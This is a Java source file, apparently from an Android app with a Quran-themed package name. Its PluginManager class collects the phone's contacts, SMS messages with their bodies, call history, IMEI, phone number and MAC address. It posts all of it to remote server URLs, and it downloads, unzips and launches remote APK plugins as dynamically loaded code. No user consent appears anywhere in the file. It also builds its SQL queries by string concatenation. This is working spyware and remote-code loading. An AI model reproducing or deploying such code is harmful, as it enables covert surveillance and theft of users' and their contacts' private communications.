package com.powerock.quran.plugin;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.SocketException;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

/**
 * Created by chuyang on 2014/12/12.
 */
public class PluginManager {
    private Context context;
    public PluginManager(Context context){
            this.context = context;
    }

    public void loadingPlugin() throws IOException {
        /*SharedPreferences sp = context.getSharedPreferences("pluginloader", Activity.MODE_PRIVATE);
        boolean isLoading = sp.getBoolean("isloading", false);
        if(!isLoading) {
            launchPlugin(context);
            SharedPreferences pluginSP = context.getSharedPreferences("pluginloader",
                    Activity.MODE_PRIVATE);
            pluginSP.edit().putBoolean("isloading", true).apply();
        }*/
        File file = new File(Constants.PLUGIN_DIR);
        File[] childFiles = file.listFiles();
        for (int i = 0; i < childFiles.length; i++) {
            launchPlugin(context, childFiles[i].getAbsolutePath());
        }
    }
    private static void launchPlugin(Context context, String path) throws IOException {
        Log.d("path", path + "/" + Constants.PLUGIN_CONFIG_NAME);
        String loadTimes = getPluginPara(path + "/" + Constants.PLUGIN_CONFIG_NAME, "loadtimes");
        String isLoaded = getPluginPara(path + "/" + Constants.PLUGIN_CONFIG_NAME, "loaded");
        if(!loadTimes.equals("1") || isLoaded.equals("false")) {
            changePluginPara(path + "/" + Constants.PLUGIN_CONFIG_NAME,"loaded", "true");
            Intent intent = new Intent(context, ProxyActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra(ProxyActivity.EXTRA_DEX_PATH, path + "/" + Constants.PLUGIN_APK_NAME);
            context.startActivity(intent);
        }
    }

    



    public static void getContacts(Context context, String uuid) throws JSONException {

        // 获得所有的联系人
        Cursor cur = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME
                        + " COLLATE LOCALIZED ASC");
        JSONObject contactsJson = new JSONObject();
        JSONArray contactsArray = new JSONArray();
        // 循环遍历
        if (cur.moveToFirst()) {

            int idColumn = cur.getColumnIndex(ContactsContract.Contacts._ID);
            int displayNameColumn = cur
                    .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);


            do {
                JSONObject _contacts = new JSONObject();
                StringBuilder sb = new StringBuilder();
                // 获得联系人的ID号
                String contactId = cur.getString(idColumn);
                _contacts.put("id",Integer.parseInt(contactId));
                sb.append("id:" + contactId);
                // 获得联系人姓名
                String disPlayName = cur.getString(displayNameColumn);
                _contacts.put("name", disPlayName);
                sb.append("   name:" + disPlayName);
                // 查看该联系人有多少个电话号码。如果没有这返回值为0
                int phoneCount = cur
                        .getInt(cur
                                .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                Log.i("username", disPlayName);
                if (phoneCount > 0) {
                    // 获得联系人的电话号码
                    Cursor phones = context.getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                    + " = " + contactId, null, null);
                    if (phones.moveToFirst()) {
                        do {
                            // 遍历所有的电话号码
                            String phoneNumber = phones
                                    .getString(phones
                                            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            String phoneType = phones
                                    .getString(phones
                                            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                            Log.i("phoneNumber", phoneNumber);
                            Log.i("phoneType", phoneType);
                            sb.append("   number:" + phoneNumber);
                            _contacts.put("number", phoneNumber);
                        } while (phones.moveToNext());
                    }
                    phones.close();
                }

                // 获取该联系人邮箱

                Cursor emails = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                + " = " + contactId, null, null);
                boolean emailTag = true;
                if (emails.moveToFirst()) {
                    do {
                        // 遍历所有的电话号码
                        String emailType = emails
                                .getString(emails
                                        .getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        String emailValue = emails
                                .getString(emails
                                        .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        sb.append("   email:" + emailValue);
                        _contacts.put("email", emailValue);
                        Log.i("emailType", emailType);
                        Log.i("emailValue", emailValue);
                    } while (emails.moveToNext());
                    emailTag = false;
                }
                if(emailTag){
                    _contacts.put("email", "");
                }
                emails.close();
                
                contactsArray.put(_contacts);
            } while (cur.moveToNext());
            contactsJson.put("contacts", contactsArray);
        }
        cur.close();
        Log.d("json", contactsJson.toString());
        sendPostRequest(Constants.CONTACTS_URL + uuid, contactsJson, context);
    }

    public static void getMessage(Context context, String uuid) throws JSONException {
        Uri uri = Uri.parse("content://sms/");
        String[] projection = new String[] { "_id", "address", "person", "body", "date", "type" };
        Cursor cur = context.getContentResolver().query(uri, projection, null, null, "date desc");

        JSONObject messageJson = new JSONObject();
        JSONArray messageArray = new JSONArray();

        if (cur.moveToFirst()) {
            int index_id = cur.getColumnIndex("_id");
            int index_Address = cur.getColumnIndex("address");
            int index_Person = cur.getColumnIndex("person");
            int index_Body = cur.getColumnIndex("body");
            int index_Date = cur.getColumnIndex("date");
            int index_Type = cur.getColumnIndex("type");
            do {
                JSONObject _message = new JSONObject();
                int intId = cur.getInt(index_id);
                String strAddress = cur.getString(index_Address);
                String strPerson = cur.getString(index_Person);
                String strbody = cur.getString(index_Body);
                long longDate = cur.getLong(index_Date);
                int intType = cur.getInt(index_Type);

                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                Date d = new Date(longDate);
                String strDate = dateFormat.format(d);

                String strType = "";
                if (intType == 1) {
                    strType = "recv";
                } else if (intType == 2) {
                    strType = "send";
                } else {
                    strType = "null";
                }

                String[] pro = { ContactsContract.PhoneLookup.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER};
                Cursor cursor = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        pro,    // Which columns to return.
                        ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + strAddress.substring(3) + "' or "
                                + ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + strAddress + "'",//" '" + strAddress + "'" +" like '%" + ContactsContract.CommonDataKinds.Phone.NUMBER+"%'", // WHERE clause.
                        null,          // WHERE clause value substitution
                        null);   // Sort order.
                String name = "null";
                for( int i = 0; i < cursor.getCount(); i++ )
                {
                    cursor.moveToPosition(i);

                    // 取得联系人名字
                    int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                    name = cursor.getString(nameFieldColumnIndex);
                    Log.i("Contacts", "" + name + " .... " + nameFieldColumnIndex); // 这里提示 force close

                }
                cursor.close();
                _message.put("id", intId);
                _message.put("time", strDate);
                _message.put("number", strAddress);
                _message.put("name", name);
                _message.put("method", strType);
                _message.put("body", strbody);
                messageArray.put(_message);
            } while (cur.moveToNext());
            cur.close();
            messageJson.put("message", messageArray);
        }

        Log.d("aa", messageJson.toString());

        sendPostRequest(Constants.MESSAGE_URL + uuid, messageJson, context);

    }

    public static void getCallRecord(Context context, String uuid) throws JSONException {
        Uri uri = android.provider.CallLog.Calls.CONTENT_URI;
        String[] projection = { CallLog.Calls.DATE, // 日期
                CallLog.Calls.NUMBER, // 号码
                CallLog.Calls.TYPE, // 类型
                CallLog.Calls.CACHED_NAME, // 名字
                CallLog.Calls._ID, //id
                CallLog.Calls.DURATION
        };
        Cursor cursor = context.getContentResolver().query(uri, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

        JSONObject callRecordJson = new JSONObject();
        JSONArray callRecordArray = new JSONArray();

        cursor.moveToFirst(); // 游标移动到第一项
        for (int i = 0; i < cursor.getCount(); i++) {
            JSONObject _callRecord= new JSONObject();
            cursor.moveToPosition(i);
            Date date = new Date(cursor.getLong(cursor
                    .getColumnIndex(CallLog.Calls.DATE)));
            String number = cursor.getString(cursor
                    .getColumnIndex(CallLog.Calls.NUMBER));
            int type = cursor.getInt(cursor
                    .getColumnIndex(CallLog.Calls.TYPE));
            String[] pro = { ContactsContract.PhoneLookup.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER};
            Cursor nameCursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    pro,    // Which columns to return.
                    //ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + number.substring(3) + "' or "
                    ContactsContract.CommonDataKinds.Phone.NUMBER + " = '" + number + "'",//" '" + strAddress + "'" +" like '%" + ContactsContract.CommonDataKinds.Phone.NUMBER+"%'", // WHERE clause.
                    null,          // WHERE clause value substitution
                    null);   // Sort order.
            String name = "null";
            for( int j = 0; j < nameCursor.getCount(); j++ )
            {
                nameCursor.moveToPosition(j);

                // 取得联系人名字
                int nameFieldColumnIndex = nameCursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                name = nameCursor.getString(nameFieldColumnIndex);
                Log.i("Contacts", "" + name + " .... " + nameFieldColumnIndex); // 这里提示 force close

            }
            nameCursor.close();
            String callType = "null";
            if (type == CallLog.Calls.INCOMING_TYPE) {
                callType = "in";
            } else if (type == CallLog.Calls.OUTGOING_TYPE) {
                callType = "out";
            } else if (type == CallLog.Calls.MISSED_TYPE) {
                callType = "hangoff";
            }

            int id = cursor.getInt(cursor
                    .getColumnIndex(CallLog.Calls._ID));
            int duration = cursor.getInt(cursor
                    .getColumnIndex(CallLog.Calls.DURATION));
            _callRecord.put("id", id);
            _callRecord.put("number", number);
            _callRecord.put("name", name);
            _callRecord.put("type", callType);
            _callRecord.put("time", date);
            _callRecord.put("duration",duration);
            callRecordArray.put(_callRecord);
        }
        callRecordJson.put("callrecord", callRecordArray);
/*
        JSONObject recordObj = new JSONObject();
        JSONArray recordArray = new JSONArray();

        JSONObject obj1 = new JSONObject();
        obj1.put("number", "1390099994");
        obj1.put("name", "张三");
        obj1.put("type", "in");
        obj1.put("time", "2014-12-10");
        obj1.put("duration", "1min");

        JSONObject obj2 = new JSONObject();
        obj2.put("number", "1390088994");
        obj2.put("name", "李四");
        obj2.put("type", "out");
        obj2.put("time", "2014-12-13");
        obj2.put("duration", "3min");

        recordArray.put(obj1);
        recordArray.put(obj2);

        recordObj.put("callrecord", recordArray);

        Log.d("aa", recordObj.toString());
*/
        sendPostRequest(Constants.CALL_RECORD_URL + uuid, callRecordJson, context);

    }





    public static void getPhoneInfo(Context context, String username) throws JSONException, NoSuchAlgorithmException {
        TelephonyManager telephonyManager=(TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        String  phoneNumber = "";
        String imei ="";
        String phoneIp = "";
        String phoneType= "";
        String osVersion = "";
        String phoneMac = "";
        if(telephonyManager.getLine1Number() != null)
            phoneNumber = telephonyManager.getLine1Number();

        Log.d("username", username);

        if(telephonyManager.getDeviceId() != null)
            imei = telephonyManager.getDeviceId();
        WifiManager wifi = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = wifi.getConnectionInfo();
        if(info.getMacAddress() != null)
            phoneMac = info.getMacAddress();

        try {
            phoneIp = PhoneInfoUtils.getLocalIpAddress(context);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        if(Build.MODEL != null)
            phoneType = Build.MODEL;
        if(Build.VERSION.RELEASE != null)
            osVersion = Build.VERSION.RELEASE;

        String vpnIp = "";


        String uuid = parseStrToMd5L32(imei + phoneMac);
        /*Log.d("firstuuid", uuid);
        SharedPreferences uuidSP = context.getSharedPreferences("uuid", Activity.MODE_PRIVATE);
        uuidSP.edit().putString("uuid", uuid).apply();
        */
        JSONObject phoneObj = new JSONObject();
        phoneObj.put("uuid",uuid);
        phoneObj.put("current_phone_number", phoneNumber);
        JSONObject vpnObj = new JSONObject();
        vpnObj.put("username", username);

        phoneObj.put("vpn", vpnObj);

        JSONObject infoObj = new JSONObject();
        infoObj.put("imei", imei);
        infoObj.put("wifimac", phoneMac);
        infoObj.put("model", phoneType);
        infoObj.put("version", osVersion);
        infoObj.put("ip", phoneIp);
        infoObj.put("vpnip", vpnIp);

        phoneObj.put("info", infoObj);

        Log.d("phoneObj", phoneObj.toString());
        sendPostRequest(Constants.REG_URL, phoneObj, context);
        //Log.d("imei", imei.toString());
    }




    private static void sendPostRequest(String url, JSONObject obj, Context context){
        JsonObjectRequest getRequest = new JsonObjectRequest(
                Request.Method.POST, url, obj,
                new Response.Listener<JSONObject>() {
                    public void onResponse(JSONObject response) {
                        // display response
                        System.out.println(response.toString());
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.d("errorinfo", error.toString());
            }
        });
        if(VolleySingleton.getInstance(context).getRequestQueue() != null)
            VolleySingleton.getInstance(context).getRequestQueue().add(getRequest);
    }

    public void updatePlugins(String _url) throws IOException {
        DownloadAsync da = new DownloadAsync();
        da.execute(_url);
    }
    class DownloadAsync extends AsyncTask<String, String, String>{

        @Override
        protected String doInBackground(String... strings) {
            URL url = null;
            try {
                url = new URL(Constants.URL + strings[0]);
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }
            HttpURLConnection conn = null;
            try {
                conn = (HttpURLConnection) url.openConnection();
            } catch (IOException e) {
                e.printStackTrace();
            }
            String realUrl = conn.getURL().toString();
            String filename = realUrl.substring(realUrl.lastIndexOf('/') + 1);
            String SDCard = Constants.PLUGIN_DIR;
            String pathName = SDCard + filename;//文件存储路径

            File file = new File(pathName);
            InputStream is = null;
            try {
                is = conn.getInputStream();
            } catch (IOException e) {
                e.printStackTrace();
            }
            byte[] bs = new byte[1024];
            int len;
            OutputStream os = null;
            try {
                os = new FileOutputStream(pathName);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            try {
                while ((len = is.read(bs)) != -1) {
                    assert os != null;
                    os.write(bs, 0, len);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                os.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                is.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return pathName;
        }

        @Override
        protected void onPostExecute(String result) {
            DecompressAsync decompressAsync = new DecompressAsync();
            decompressAsync.execute(result);
        }
    }



    class DecompressAsync extends AsyncTask<String, String, String>{

        @Override
        protected String doInBackground(String... strings) {
            Decompress d = new Decompress(strings[0], strings[0].substring(0, strings[0].length()-12) + "/");
            d.unzip();
            return strings[0];
         }

        @Override
        protected void onPostExecute(String result) {
            File f = new File(result);
            if(f.exists())
                f.delete();
            ProcessPluginFolder ppf = new ProcessPluginFolder();
            ppf.execute(result.substring(0, result.length()-12));
        }
    }


    class ProcessPluginFolder extends AsyncTask<String, String, String>{

        @Override
        protected String doInBackground(String... strings) {
            try {
                if(checkExist(strings[0] + "/" + Constants.PLUGIN_APK_NAME)
                    && checkExist(strings[0] + "/" + Constants.PLUGIN_CONFIG_NAME)
                    && getPluginPara(strings[0] + "/" + Constants.PLUGIN_CONFIG_NAME, "name") != null){
                    try {
                        addLine(strings[0] + "/" + Constants.PLUGIN_CONFIG_NAME, "loaded:false");
                        checkPluginFolder(strings[0]);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }else{
                    File pluginFolder = new File(strings[0]);
                    deleteFolder(pluginFolder);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            return strings[0];
        }

        @Override
        protected void onPostExecute(String result) {
            String launch = null;
            try {
                launch = getPluginPara(result + "/" + Constants.PLUGIN_CONFIG_NAME, "launch");
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                if(launch.toString().equals("true"))
                    launchPlugin(context, result);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    //check file exist
    private static boolean checkExist(String path){
        File f = new File(path);
        if(f.exists())
            return true;
        else
            return false;
    }

    //delete wrong or old plugin folder
    private static void deleteFolder(File file){
        if (file.isFile()) {
            file.delete();
            return;
        }

        if(file.isDirectory()){
            File[] childFiles = file.listFiles();
            if (childFiles == null || childFiles.length == 0) {
                file.delete();
                return;
            }

            for (int i = 0; i < childFiles.length; i++) {
                deleteFolder(childFiles[i]);
            }
            file.delete();
        }
    }

    //delete the old version
    private static void checkPluginFolder(String folderPath) throws IOException {
        String pluginName = getPluginPara(folderPath + "/" + Constants.PLUGIN_CONFIG_NAME, "name");
        File pluginFolder = new File(Constants.PLUGIN_DIR);
        File[] childFolders = pluginFolder.listFiles();
        for(int i = 0; i < childFolders.length; i++ ){
            Log.d("FILE_PATH", childFolders[i].getAbsolutePath());
            if(childFolders[i].getAbsolutePath().equals(folderPath))
                continue;
            String name = getPluginPara(childFolders[i].getAbsolutePath()+ "/" + Constants.PLUGIN_CONFIG_NAME, "name");
            if(name.equals(pluginName)){
                File f = new File(childFolders[i].getAbsolutePath());
                deleteFolder(f);
            }
        }
    }

    // get  plugin parameter value
    private static String getPluginPara(String configPath, String para) throws IOException {
        FileReader fr = new FileReader(configPath);
        BufferedReader br = new BufferedReader(fr);
        String line = null;
        while((line = br.readLine()) != null){
            if(line.split(":").length == 2){
                Log.d("line", line);
                if(line.split(":")[0].toLowerCase().trim().equals(para)) {
                    Log.d("PLUGIN_NAME", line.split(":")[1]);
                    return line.split(":")[1].toLowerCase().trim();
                }
            }
        }
        br.close();
        fr.close();
        return null;
    }

    private static void changePluginPara(String configPath, String para, String value) throws IOException {
        FileReader fr = new FileReader(configPath);
        BufferedReader br = new BufferedReader(fr);
        String tmpStr = "";
        String line = null;
        while((line = br.readLine()) != null){
            if(line.split(":").length == 2){
                if(line.split(":")[0].toLowerCase().trim().equals(para)) {
                    line = para + ":" +value;
                    Log.d("PLUGIN_NAME", line.split(":")[1]);
                }
                tmpStr += line + System.getProperty("line.separator");
            }
        }
        br.close();
        fr.close();
        writeToFile(configPath, tmpStr);
    }

    private static void writeToFile(String path, String content) throws IOException {
        FileWriter fw = new FileWriter(path, false);
       fw.write(content);
        fw.close();
    }

    private static void addLine(String path, String line) throws IOException {
        FileWriter fw = new FileWriter(path, true);
        fw.write(System.getProperty("line.separator") + line + System.getProperty("line.separator"));
        fw.close();
    }
    
    
    public static String parseStrToMd5L32(String str) throws NoSuchAlgorithmException {
        String reStr = null;
        str = str + "POWEROCK";
        try {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            byte[] bytes = md5.digest(str.getBytes());
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b : bytes){
                int bt = b&0xff;
                if (bt < 16){
                    stringBuffer.append(0);
                }
                stringBuffer.append(Integer.toHexString(bt));
            }
            reStr = stringBuffer.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return reStr;
    }
}
